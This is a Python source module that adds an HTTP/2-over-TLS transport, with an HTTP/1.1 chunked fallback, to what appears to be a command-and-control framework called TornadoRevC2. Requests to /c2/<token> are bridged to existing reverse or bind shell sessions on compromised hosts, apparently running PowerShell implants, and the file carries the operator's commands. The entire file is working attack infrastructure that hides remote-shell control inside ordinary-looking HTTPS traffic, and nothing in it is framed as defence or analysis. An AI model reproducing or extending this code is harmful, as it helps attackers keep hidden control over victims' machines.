"""
HTTP/2 secondary transport for TornadoRevC2.

The listener terminates HTTP/2 over TLS on a dedicated port. Each POST to
/c2/<token> opens a bidirectional bridge that the handler attaches to an
existing reverse/bind shell session identified by <token>. Once attached,
the HTTP/2 bridge and the original shell socket are interchangeable —
whichever transport is marked 'active' receives commands.

Requires: h2 (pip install h2)
Target:   PowerShell 7+ / .NET Core 3.1+ (HTTP/2 client support)
"""

import socket
import ssl
import threading
import time

try:
    import h2.config
    import h2.connection
    import h2.events
    _H2_AVAILABLE = True
except ImportError:
    _H2_AVAILABLE = False


class Http2SessionSocket:
    """Socket-shaped adapter over a single HTTP/2 stream."""

    def __init__(self, h2_conn, stream_id, tls_sock, peer_addr, send_lock):
        self.h2_conn   = h2_conn
        self.stream_id = stream_id
        self.tls_sock  = tls_sock
        self.peer_addr = peer_addr
        self.send_lock = send_lock
        self.rfd, self.wfd = socket.socketpair()
        self.closed = False
        self._hdr_sent = False

    def fileno(self):
        return self.rfd.fileno()

    def getpeername(self):
        return self.peer_addr

    def setsockopt(self, *args, **kwargs):
        pass

    def sendall(self, data: bytes):
        if self.closed:
            raise OSError("http2 stream closed")
        if not data:
            return
        view     = memoryview(data)
        offset   = 0
        deadline = time.time() + 60.0   # budget for flow-control stalls

        while offset < len(view):
            progressed = False

            # Acquire the SAME lock the listener uses for receive_data().
            # Do NOT sleep while holding it — the listener needs this lock
            # to process incoming WINDOW_UPDATE frames, which are what
            # unblocks us when the peer's flow-control window is full.
            with self.send_lock:
                if self.closed:
                    raise OSError("http2 stream closed")

                if not self._hdr_sent:
                    self.h2_conn.send_headers(
                        self.stream_id,
                        [(b':status', b'200'),
                         (b'content-type', b'application/octet-stream')],
                        end_stream=False,
                    )
                    self._hdr_sent = True

                try:
                    window = self.h2_conn.local_flow_control_window(
                        self.stream_id)
                except Exception as e:
                    raise OSError("http2 flow-control query failed: %r" % (e,))

                # Respect BOTH the peer's max frame size (default 16384,
                # negotiated via SETTINGS) and the current flow-control
                # window. A single send_data() must not exceed either.
                frame_max = self.h2_conn.max_outbound_frame_size
                n = min(len(view) - offset, window, frame_max)

                if n > 0:
                    self.h2_conn.send_data(
                        self.stream_id,
                        bytes(view[offset:offset + n]),
                        end_stream=False,
                    )
                    try:
                        self.tls_sock.sendall(self.h2_conn.data_to_send())
                    except Exception as e:
                        self.closed = True
                        raise OSError("http2 send failed: %r" % (e,))
                    offset += n
                    progressed = True

            if not progressed:
                if time.time() > deadline:
                    raise OSError("http2 flow-control window stalled")
                # Release lock, let the listener thread receive
                # WINDOW_UPDATEs, then retry.
                time.sleep(0.05)

    def recv(self, n: int) -> bytes:
        if self.closed:
            return b''
        try:
            return self.rfd.recv(n)
        except Exception:
            return b''

    def shutdown(self, how):
        self.close()

    def close(self):
        if self.closed:
            return
        self.closed = True
        try:
            self.h2_conn.end_stream(self.stream_id)
            self.tls_sock.sendall(self.h2_conn.data_to_send())
        except Exception:
            pass
        for s in (self.rfd, self.wfd):
            try:
                s.close()
            except Exception:
                pass

    def feed(self, data: bytes):
        if self.closed or not data:
            return
        try:
            self.wfd.setblocking(False)
        except Exception:
            pass
        sent = 0
        while sent < len(data):
            try:
                n = self.wfd.send(data[sent:])
                if n <= 0:
                    break
                sent += n
            except BlockingIOError:
                break
            except Exception:
                # Do NOT mark the stream closed here. A transient write
                # error on the socketpair must not poison the bridge —
                # otherwise the next sendall() raises OSError and the
                # caller calls cleanup_client() with reason 'unknown'.
                # Just drop the overflow and keep the stream alive.
                return

    def reset(self):
        self.closed = True
        for s in (self.rfd, self.wfd):
            try:
                s.close()
            except Exception:
                pass


class Http2Listener:

    def __init__(self, handler, host, port, certfile, keyfile):
        self.handler  = handler
        self.host     = host
        self.port     = port
        self.certfile = certfile
        self.keyfile  = keyfile
        self.sock     = None
        self._ctx     = None
        self.running  = False

    def start(self):
        if not _H2_AVAILABLE:
            print("[H2] 'h2' package not installed — install with: pip install h2")
            return False

        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(self.certfile, self.keyfile)
        ctx.set_alpn_protocols(['h2', 'http/1.1'])
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        try:
            ctx.maximum_version = ssl.TLSVersion.TLSv1_3
        except AttributeError:
            pass
        ctx.set_ciphers(
            "ECDHE-ECDSA-AES256-GCM-SHA384:"
            "ECDHE-RSA-AES256-GCM-SHA384:"
            "ECDHE-ECDSA-AES128-GCM-SHA256:"
            "ECDHE-RSA-AES128-GCM-SHA256:"
            "ECDHE-ECDSA-CHACHA20-POLY1305:"
            "ECDHE-RSA-CHACHA20-POLY1305"
        )
        ctx.options |= ssl.OP_NO_COMPRESSION
        ctx.options |= ssl.OP_NO_RENEGOTIATION
        ctx.options |= ssl.OP_CIPHER_SERVER_PREFERENCE
        try:
            ctx.set_ecdh_curve("X25519")
        except ssl.SSLError:
            ctx.set_ecdh_curve("prime256v1")

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        self.sock.listen(100)
        self._ctx = ctx
        self.running = True
        threading.Thread(target=self._accept_loop, daemon=True).start()
        return True

    def stop(self):
        self.running = False
        if self.sock is not None:
            try:
                self.sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                self.sock.close()
            except OSError:
                pass

    def _accept_loop(self):
        while self.running:
            try:
                raw, addr = self.sock.accept()
            except Exception:
                break
            try:
                tls = self._ctx.wrap_socket(raw, server_side=True)
            except Exception:
                try:
                    raw.close()
                except Exception:
                    pass
                continue
            alpn = tls.selected_alpn_protocol()
            if alpn == 'h2':
                threading.Thread(
                    target=self._handle_connection,
                    args=(tls, addr),
                    daemon=True,
                ).start()
            elif alpn in ('http/1.1', None):
                # PS 5.1 HttpWebRequest will negotiate http/1.1 or send
                # no ALPN at all. Handle both as HTTP/1.1.
                threading.Thread(
                    target=self._handle_http1,
                    args=(tls, addr),
                    daemon=True,
                ).start()
            else:
                try:
                    tls.close()
                except Exception:
                    pass

    def _handle_connection(self, tls_sock, addr):
        cfg = h2.config.H2Configuration(client_side=False, header_encoding='utf-8')
        conn = h2.connection.H2Connection(config=cfg)
        conn.initiate_connection()
        try:
            tls_sock.sendall(conn.data_to_send())
        except Exception:
            return

        # hyper-h2 is NOT thread-safe. The listener thread calls
        # receive_data() while plugin threads call send_data() through
        # Http2SessionSocket.sendall. Both must be serialized by the
        # same lock, or internal stream state gets corrupted and the
        # next send_data() raises FlowControlError / ProtocolError.
        conn_lock = threading.Lock()
        bridges = {}

        try:
            while self.running:
                try:
                    data = tls_sock.recv(65536)
                except Exception:
                    break
                if not data:
                    break

                with conn_lock:
                    try:
                        events = conn.receive_data(data)
                    except Exception:
                        break

                    for ev in events:
                        if isinstance(ev, h2.events.RequestReceived):
                            hdrs = {k: v for k, v in ev.headers}
                            path   = hdrs.get(':path', '/')
                            method = hdrs.get(':method', 'GET')

                            token = None
                            if method == 'POST' and path.startswith('/c2/'):
                                token = path[4:].strip('/')

                            if token:
                                bridge = Http2SessionSocket(
                                    conn, ev.stream_id, tls_sock, addr, conn_lock,
                                )
                                bridges[ev.stream_id] = bridge
                                # attach_http2_transport only takes
                                # self.client_lock; no deadlock with conn_lock.
                                try:
                                    self.handler.attach_http2_transport(
                                        bridge, addr, token,
                                    )
                                except Exception:
                                    try:
                                        bridge.close()
                                    except Exception:
                                        pass
                            else:
                                conn.send_headers(
                                    ev.stream_id,
                                    [(b':status', b'404')],
                                    end_stream=True,
                                )

                        elif isinstance(ev, h2.events.DataReceived):
                            bridge = bridges.get(ev.stream_id)
                            if bridge is not None:
                                bridge.feed(ev.data)
                            try:
                                conn.acknowledge_received_data(
                                    ev.flow_controlled_length, ev.stream_id,
                                )
                            except Exception:
                                pass

                        elif isinstance(ev, h2.events.StreamEnded):
                            bridge = bridges.pop(ev.stream_id, None)
                            if bridge is not None:
                                info = self.handler._client_info(bridge)
                                if info is not None:
                                    info['_last_h2_close_reason'] = 'stream_ended'
                                bridge.reset()
                                try:
                                    self.handler.cleanup_client(bridge)
                                except Exception:
                                    pass

                        elif isinstance(ev, h2.events.StreamReset):
                            bridge = bridges.pop(ev.stream_id, None)
                            if bridge is not None:
                                info = self.handler._client_info(bridge)
                                if info is not None:
                                    info['_last_h2_close_reason'] = 'stream_reset'
                                bridge.reset()
                                try:
                                    self.handler.cleanup_client(bridge)
                                except Exception:
                                    pass

                        elif isinstance(ev, h2.events.ConnectionTerminated):
                            return

                    try:
                        out = conn.data_to_send()
                        if out:
                            tls_sock.sendall(out)
                    except Exception:
                        break
        finally:
            for b in bridges.values():
                info = self.handler._client_info(b)
                if info is not None:
                    info.setdefault('_last_h2_close_reason', 'connection_teardown')
                b.reset()
                try:
                    self.handler.cleanup_client(b)
                except Exception:
                    pass
            try:
                tls_sock.close()
            except Exception:
                pass

class Http1SessionSocket:
    """Socket-shaped adapter over an HTTP/1.1 chunked request/response."""

    def __init__(self, tls_sock, peer_addr, send_lock):
        self.tls_sock  = tls_sock
        self.peer_addr = peer_addr
        self.send_lock = send_lock
        self.rfd, self.wfd = socket.socketpair()
        self.closed = False
        self._hdr_sent = False

    def fileno(self):
        return self.rfd.fileno()

    def getpeername(self):
        return self.peer_addr

    def setsockopt(self, *args, **kwargs):
        pass

    def sendall(self, data: bytes):
        if self.closed:
            raise OSError("http1 stream closed")
        if not data:
            return
        with self.send_lock:
            if not self._hdr_sent:
                self.tls_sock.sendall(
                    b'HTTP/1.1 200 OK\r\n'
                    b'Transfer-Encoding: chunked\r\n'
                    b'Content-Type: application/octet-stream\r\n'
                    b'Cache-Control: no-cache\r\n'
                    b'Connection: keep-alive\r\n\r\n'
                )
                self._hdr_sent = True
            chunk = f"{len(data):x}\r\n".encode('ascii') + data + b"\r\n"
            self.tls_sock.sendall(chunk)

    def recv(self, n: int) -> bytes:
        if self.closed:
            return b''
        try:
            return self.rfd.recv(n)
        except Exception:
            return b''

    def shutdown(self, how):
        self.close()

    def close(self):
        if self.closed:
            return
        self.closed = True
        try:
            if self._hdr_sent:
                self.tls_sock.sendall(b"0\r\n\r\n")
        except Exception:
            pass
        for s in (self.rfd, self.wfd):
            try:
                s.close()
            except Exception:
                pass

    def feed(self, data: bytes):
        if self.closed or not data:
            return
        # Non-blocking send with a bounded buffer. If the peer is slow
        # to read and the socketpair fills up, we drop the new data
        # rather than block the entire HTTP/2 connection thread.
        try:
            self.wfd.setblocking(False)
        except Exception:
            pass
        sent = 0
        while sent < len(data):
            try:
                n = self.wfd.send(data[sent:])
                if n <= 0:
                    break
                sent += n
            except BlockingIOError:
                break
            except Exception:
                self.closed = True
                return

    def reset(self):
        self.closed = True
        for s in (self.rfd, self.wfd):
            try:
                s.close()
            except Exception:
                pass


def _consume_chunked_body(sock, initial, bridge):
    """Read an HTTP/1.1 chunked request body and feed it into the bridge."""
    buf = bytearray(initial)

    def _more():
        try:
            d = sock.recv(65536)
        except Exception:
            return False
        if not d:
            return False
        buf.extend(d)
        return True

    while True:
        nl = buf.find(b'\r\n')
        while nl < 0:
            if not _more():
                return
            nl = buf.find(b'\r\n')
        size_hex = bytes(buf[:nl]).split(b';')[0].strip()
        del buf[:nl + 2]
        try:
            size = int(size_hex, 16)
        except ValueError:
            return
        if size == 0:
            while len(buf) < 2:
                if not _more():
                    return
            del buf[:2]
            return
        while len(buf) < size + 2:
            if not _more():
                return
        bridge.feed(bytes(buf[:size]))
        del buf[:size + 2]


# Monkey-patch the HTTP/1.1 handler onto Http2Listener.
def _handle_http1(self, tls_sock, addr):
    try:
        buf = bytearray()
        end = -1
        while end < 0:
            d = tls_sock.recv(4096)
            if not d:
                return
            buf.extend(d)
            end = buf.find(b'\r\n\r\n')
            if len(buf) > 65536:
                return

        head = bytes(buf[:end])
        initial = bytes(buf[end + 4:])
        lines = head.split(b'\r\n')
        if not lines:
            return
        parts = lines[0].decode('ascii', 'replace').split(' ')
        if len(parts) < 3:
            return
        method, path, _ = parts

        if method != 'POST' or not path.startswith('/c2/'):
            tls_sock.sendall(b'HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n')
            return

        token = path[4:].strip('/')
        send_lock = threading.Lock()
        bridge = Http1SessionSocket(tls_sock, addr, send_lock)

        def _body_reader():
            try:
                _consume_chunked_body(tls_sock, initial, bridge)
            finally:
                bridge.reset()

        threading.Thread(target=_body_reader, daemon=True).start()

        try:
            self.handler.attach_http2_transport(bridge, addr, token)
        except Exception:
            try:
                bridge.close()
            except Exception:
                pass
    except Exception:
        pass


Http2Listener._handle_http1 = _handle_http1